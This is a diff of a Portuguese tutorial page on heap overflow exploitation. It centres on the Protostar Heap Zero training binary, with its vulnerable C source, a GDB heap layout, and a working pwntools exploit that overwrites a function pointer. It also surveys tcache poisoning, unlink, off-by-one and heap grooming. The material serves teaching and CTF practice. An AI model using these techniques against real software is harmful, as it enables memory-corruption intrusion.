@@ -3,207 +3,114 @@ title: Heap Overflow
 sidebar_position: 1
 ---
 
-Heap Overflow é uma vulnerabilidade que ocorre quando um programa escreve dados além dos limites do buffer alocado na heap, semelhantemente ao Buffer Overflow.
+Heap Overflow é escrever além do tamanho de um chunk. Como os chunks são contíguos, os bytes excedentes caem sobre o **chunk seguinte**: primeiro o header dele (`prev_size`, `size`), depois os dados. Diferente da stack, não há endereço de retorno nem canary por perto: o que se ganha depende do que está no chunk vizinho.
 
-Para entender melhor, vamos usar um binário do [Protostar](https://exploit.education/protostar/), série de desafios do exploit.education (o [Phoenix](https://exploit.education/phoenix/) é a versão mais nova da mesma série).
+Em uma heap sem chunks livres, cada `malloc` corta um pedaço do top chunk, então **chunks alocados em sequência ficam lado a lado, na ordem das alocações**. Havendo chunks livres nas bins, o `malloc` os reaproveita e a ordem na memória deixa de seguir a ordem das chamadas.
 
-## Heap Zero
+## Exemplo: Protostar Heap Zero
 
-Você pode acessar o site do binário [Aqui](https://exploit.education/protostar/heap-zero/).
+Binário do [Protostar](https://exploit.education/protostar/heap-zero/) (exploit.education), 32 bits:
 
 ```c
-#include <stdlib.h>
-#include <unistd.h>
-#include <string.h>
-#include <stdio.h>
-#include <sys/types.h>
+struct data { char name[64]; };
+struct fp   { int (*fp)(); };
 
-struct data {
-  char name[64];
-};
-
-struct fp {
-  int (*fp)();
-};
-
-void winner()
-{
-  printf("level passed\n");
-}
-
-void nowinner()
-{
-  printf("level has not been passed\n");
-}
+void winner()   { printf("level passed\n"); }
+void nowinner() { printf("level has not been passed\n"); }
 
 int main(int argc, char **argv)
 {
-  struct data *d;
-  struct fp *f;
-
-  d = malloc(sizeof(struct data));
-  f = malloc(sizeof(struct fp));
+  struct data *d = malloc(sizeof(struct data));
+  struct fp   *f = malloc(sizeof(struct fp));
   f->fp = nowinner;
 
   printf("data is at %p, fp is at %p\n", d, f);
 
-  strcpy(d->name, argv[1]);
-  
+  strcpy(d->name, argv[1]);      // sem limite de tamanho
   f->fp();
-
 }
 ```
 
-O código é bem simples:
+Dois chunks alocados em sequência: `d` (64 bytes) e `f` (um ponteiro de função). O `strcpy` copia `argv[1]` para `d` sem limite, e em seguida o programa chama `f->fp`. O objetivo é fazer `f->fp` apontar para `winner`.
 
-1. Aloca dois chunks `d` e `f` na heap
-2. Define `f->fp` com o endereço de `nowinner`
-3. Copia o primeiro argumento da linha de comando (`./file arg1`) para `d->name`
-4. Roda o que está em `f->fp`
+### Layout
 
-
-Primeiro, vamos ver as propriedades do arquivo com `file`:
+No GDB, com um breakpoint depois dos dois `malloc`:
 
 ```
-$ file heap0        
-heap0: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=80ca72d6b53b32db329639b53c968b42a3d65a8c, not stripped
-```
-
-32 bits. Ótimo.
-
-Visualizando a `main` no `pwndbg`, temos:
-
-```c
-...
-0x0804852f <+35>:    push   0x40
-0x08048531 <+37>:    call   0x8048360 <malloc@plt>
-...
-0x0804853f <+51>:    push   0x4
-0x08048541 <+53>:    call   0x8048360 <malloc@plt>
-...
-```
-
-Isso quer dizer que o malloc aloca `0x40` = 64 bytes de dados de usuário para `d` e aloca 4 bytes para `f`. Tenha em mente que, em 32-bit, sempre teremos 8 bytes a mais de metadados (prev_size (4 bytes), size + AMP (4 bytes)).
-
-**Em uma heap "limpa" (sem chunks liberados antes), chunks alocados ficam lado a lado na memória, independentemente do tamanho, por ordem de alocação**: cada `malloc` corta um pedaço do top chunk. Quando há chunks liberados nas bins, o `malloc` pode reaproveitá-los, e aí a ordem na memória deixa de seguir a ordem das alocações.
-
-Se vermos depois da call dos mallocs, temos o endereço atribuído após o malloc retornar:
-
-```c
-0x0804852f <+35>:    push   0x40
-0x08048531 <+37>:    call   0x8048360 <malloc@plt>
-0x08048536 <+42>:    add    esp,0x10
-0x08048539 <+45>:    mov    DWORD PTR [ebp-0x20],eax     <------ d
-0x0804853c <+48>:    sub    esp,0xc
-0x0804853f <+51>:    push   0x4
-0x08048541 <+53>:    call   0x8048360 <malloc@plt>
-0x08048546 <+58>:    add    esp,0x10
-0x08048549 <+61>:    mov    DWORD PTR [ebp-0x1c],eax     <------ f
-```
-
-Se usarmos `b *main+67`, podemos olhar os endereços de `d` e `f`.
-
-```bash
-pwndbg> x/x $ebp-0x20
+pwndbg> x/x $ebp-0x20          (d)
 0xffffcc28:     0x0804b1e0
-pwndbg> x/x $ebp-0x1c
+pwndbg> x/x $ebp-0x1c          (f)
 0xffffcc2c:     0x0804b230
 ```
 
-`0x0804b1e0` é a parte de dados do chunk alocada para `d` na heap, e `0x0804b230` é a parte de dados do chunk alocada para `f`. Isso nós dá o layout completo das alocações que fizemos:
+<Mem
+  title="Heap depois dos dois malloc (32 bits: campos de 4 bytes)"
+  top="endereços baixos"
+  bottom="endereços altos"
+  cellW={300}
+  rows={[
+    {addr: '0x0804b1d8', cells: [{label: 'prev_size', kind: 'meta'}, {label: 'size = 0x51', kind: 'meta'}], note: 'chunk de d'},
+    {addr: '0x0804b1e0', label: 'd->name (64 bytes) + padding', kind: 'ctrl', h: 2.2, note: 'strcpy começa aqui'},
+    {addr: '0x0804b228', cells: [{label: 'prev_size', kind: 'meta'}, {label: 'size = 0x11', kind: 'meta'}], note: 'chunk de f'},
+    {addr: '0x0804b230', label: 'f->fp = &nowinner', kind: 'danger', note: 'alvo'},
+    {addr: '0x0804b238', label: 'top chunk', kind: 'free'},
+  ]}
+/>
 
-A heap ficará assim após `malloc(0x40)` e `malloc(0x4)`:
+O `malloc(64)` gerou um chunk de `0x50` e não de `0x48`: nas glibc atuais o tamanho é múltiplo de 16 também em 32 bits. O `size` aparece como `0x51` por causa do bit `P`.
 
-```
-Endereço    │ Conteúdo              │ Descrição
-────────────┼───────────────────────┼─────────────────────────────
-            │                       │
-0x0804b1d8  │ 0x00000000            │ ← prev_size (não usado)
-0x0804b1dc  │ 0x00000051            │ ← size = 0x50 | P(0x1) = 0x51
-            │                       │     (80 bytes, P=1)
-            ├───────────────────────┤   
-0x0804b1e0  │ name[0-3]             │ ← d aponta AQUI (dados)
-    ...     │          ...          │
-0x0804b21c  │ name[60-63]           │
-0x0804b220  │ padding (8 bytes)     │ ← padding para alinhamento
-0x0804b224  │          ...          │
-            ├═══════════════════════┤
-0x0804b228  │ 0x00000000            │ ← prev_size do chunk 2
-0x0804b22c  │ 0x00000011            │ ← size = 0x10 | P(0x1) = 0x11
-            │                       │       (16 bytes, P=1)
-            ├───────────────────────┤   
-0x0804b230  │ fp (4 bytes)          │ ← f aponta AQUI (dados)
-            │ = &nowinner           │   Ponteiro para função
-0x0804b234  │ padding (4 bytes)     │ ← padding para alinhamento
-            ├═══════════════════════┤
-0x0804b238  │ 0x00000000            │ ← top chunk (resto da heap)
-0x0804b23c  │ 0x00020fa9            │ ← size do top chunk
-            │         ...           │
-```
+A distância entre os dois ponteiros é `0x0804b230 - 0x0804b1e0 = 0x50`. Esse é o padding.
 
-Nas duas alocações acima vemos que `size` está acrescido de um, nos dois casos. Isso é o bit flag `P` (PREV_IN_USE) ativado.  E veja que `size` inclui inclusive os 8 bytes iniciais de `prev_size` e do próprio `size`: pedimos 64 bytes e o chunk tem 80 (`0x50`). Pedimos 4 e o chunk tem 16 (`0x10`, o mínimo).
-
-O malloc também sempre aloca chunks alinhados de forma que:
-
-- Tamanho do chunk = múltiplo de 16 (nas glibc modernas, mesmo em 32 bits. Nas glibc antigas de 32 bits, múltiplo de 8)
-- Ponteiro retornado = múltiplo de 16 (onde escrevemos dados)
-
-O malloc faz isso por questão de performance (acesso alinhado é mais rápido) e por causa de instruções SSE, que exigem alinhamento. É por isso que `malloc(64)` em 32 bits vira um chunk de `0x50` e não de `0x48`: `64 + 4` arredondado para múltiplo de 16 é 80.
-
-Bom, de forma simplificada:
-
-```
-Chunk malloc(0x40)
-┌─────────────┬─────────────────┬──────────────────┐
-│ prev_size   │ size=0x50 | P=1 │  72 bytes data   │
-│ (4 bytes)   │    (4 bytes)    │  (0x50 - 8)      │
-└─────────────┴─────────────────┴──────────────────┘
-                                ↑ d recebe esse endereço
-Chunk malloc(0x4)                            
-┌─────────────┬─────────────────┬──────────────────┐
-│ prev_size   │ size=0x11 | P=1 │ 4 bytes + padding│
-│ (4 bytes)   │     (4 bytes)   │ (8 bytes total)  │
-└─────────────┴─────────────────┴──────────────────┘
-                                ↑ f recebe esse endereço
-┌─────────────┬─────────────────┬──────────────────┐
-│             │                 │                  │
-│      Top chunk (resto da heap disponível)        │
-└──────────────────────────────────────────────────┘
-```
-
-O programa, na verdade, já nos dá os endereços de `d` e `f`, então nem precisávamos analisar no `pwndbg`. Porém, visando futuros exploits, é bom saber como se virar.
-
-Agora vamos fazer o Heap Overflow!
-
-Calcular a distância entre `d` e `f` é fácil, basta subtrair um do outro. `0x0804b230` - `0x0804b1e0` = `0x50`. Isso quer dizer que, se colocarmos `0x50` de padding + `winner_address`, estaremos sobrescrevendo `f->fp` com `winner_address` e executaremos a função. Repare que, no caminho, o `strcpy` passa por cima do header do chunk de `f` (`prev_size` e `size`). Aqui isso não importa, porque o programa não chama `free` nem `malloc` depois disso. Em um programa que continuasse usando a heap, corromper o `size` quebraria o alocador (`malloc(): corrupted ...`), e precisaríamos escrever um `size` válido (`0x11`) no lugar certo. Daí vem nosso payload final!
+### Exploit
 
 ```py
 from pwn import *
 
 elf = context.binary = ELF('./heap0')
 
-payload = (b'A' * 0x50 + flat(elf.sym['winner'])).replace(b'\x00', b'')
-# Obs: Os null bytes não são aceitos por argv, então temos que removê-los.
-# Obs: flat() converte valores 0x08048596 para bytearray em little endian b'\x96\x85\x04\x08'
-
+payload = b'A' * 0x50 + p32(elf.sym['winner'])
 p = elf.process(argv=[payload])
-
 print(p.clean().decode('latin-1'))
 ```
-
-Com o `payload` como `argv[1]`, não podemos ter bytes nulos nem no padding nem no endereço (o `argv` é uma string C). O endereço `0x08048596` não tem bytes nulos, então funciona. Se tivesse, o `strcpy` pararia antes e o ataque não funcionaria.
-
-Ao executar, obtemos sucesso:
 
 ```
 data is at 0x99661e0, fp is at 0x9966230
 level passed
 ```
 
+Dois detalhes:
+
+- O payload vai por `argv`, que é uma string C: não pode conter bytes nulos. O endereço `0x08048596` não tem nenhum, então passa.
+- No caminho, o `strcpy` destruiu o header do chunk de `f` (`prev_size` e `size` viraram `AAAA`). Aqui não importa, porque o programa não chama `malloc` nem `free` depois. Em um programa que continua usando a heap, um header inválido aborta o processo (`free(): invalid size`, `malloc(): corrupted top size`...). Nesse caso, o payload precisa **reescrever o header com valores válidos**: `p32(0) + p32(0x11)` na posição certa.
+
 ## O que mais dá para sobrescrever
 
-Esse exemplo sobrescreve um **ponteiro de função** no chunk vizinho, que é o caso mais direto. Outros alvos comuns de um Heap Overflow:
+O exemplo ataca um ponteiro de função, que é o caso mais direto. Os alvos, em geral:
 
-- **Metadados do chunk vizinho** (`size`, `fd`, `bk`): é a porta de entrada dos ataques das próximas páginas, como [Unlink](./unlink.mdx), [Tcache Poisoning](./tcache.mdx#tcache-poisoning) (sobrescrever o `fd` de um chunk livre vizinho) e [House of Force](./malloc-maleficarum/house-of-force.mdx) (sobrescrever o `size` do top chunk)
-- **Dados de outra estrutura**: um ponteiro para string (para fazer leitura/escrita arbitrária quando o programa usar esse ponteiro), um campo de tamanho, um `is_admin`, etc. Em desafios estilo "notes", sobrescrever o ponteiro de conteúdo de outra nota é um clássico
-- **Off-by-one**: um overflow de um único byte (o `\0` do `strcpy`, ou um `for (i = 0; i <= n; i++)`) que atinge o byte menos significativo do `size` do próximo chunk também é explorável (técnicas como *poison null byte* / House of Einherjar)
+| Alvo no chunk vizinho | Resultado | Página |
+|---|---|---|
+| Ponteiro de função / vtable | Controle do fluxo | (exemplo acima) |
+| Ponteiro para buffer (ex: `nota->conteudo`) | Leitura/escrita arbitrária quando o programa usar esse ponteiro | |
+| Campo de tamanho ou flag (`len`, `is_admin`) | Overflow maior, bypass de checagens | |
+| `fd` de um chunk **livre** no tcache/fastbin | `malloc` devolve endereço arbitrário | [Tcache Poisoning](./tcache.mdx#tcache-poisoning) |
+| `size` de um chunk alocado | Chunks sobrepostos: ao ser liberado e realocado, ele cobre os vizinhos | |
+| `prev_size` + bit `P` | Consolidação com um chunk falso | [Unlink](./unlink.mdx) |
+| `size` do top chunk | `malloc` em endereço arbitrário (glibc < 2.29) | [House of Force](./malloc-maleficarum/house-of-force.mdx) |
+
+### Off-by-one
+
+Um overflow de **um único byte** já é explorável, por causa do compartilhamento do `prev_size`: quando o pedido usa o chunk até o último byte (`malloc(0x18)`, `malloc(0x28)`, ...), o byte seguinte aos dados é o byte menos significativo do `size` do vizinho.
+
+- **Byte controlado**: aumentar o `size` do vizinho cria chunks sobrepostos.
+- **Byte nulo** (*poison null byte*, o `\0` que `strcpy` e similares escrevem): zera o bit `P` do vizinho (e reduz o `size` dele, se o byte baixo não for `0x01`), fazendo o alocador acreditar que o chunk anterior está livre. É o ponto de partida de House of Einherjar.
+
+Origens típicas: `for (i = 0; i <= n; i++)`, `buf[read(0, buf, n)] = 0`, `strncat`, `scanf("%Ns")` com `N` igual ao tamanho do buffer.
+
+### Controlando quem é o vizinho
+
+O overflow só serve se o chunk certo estiver logo depois do chunk vulnerável. Arrumar isso é o *heap grooming* (ou *feng shui*):
+
+- Aloque o chunk vulnerável e a vítima em sequência, em uma heap "limpa".
+- Ou abra um buraco: libere um chunk que fica logo **antes** da vítima e aloque o chunk vulnerável com o mesmo tamanho. Ele cai no buraco.
+- Confira com `vis` no pwndbg antes de calcular offsets.
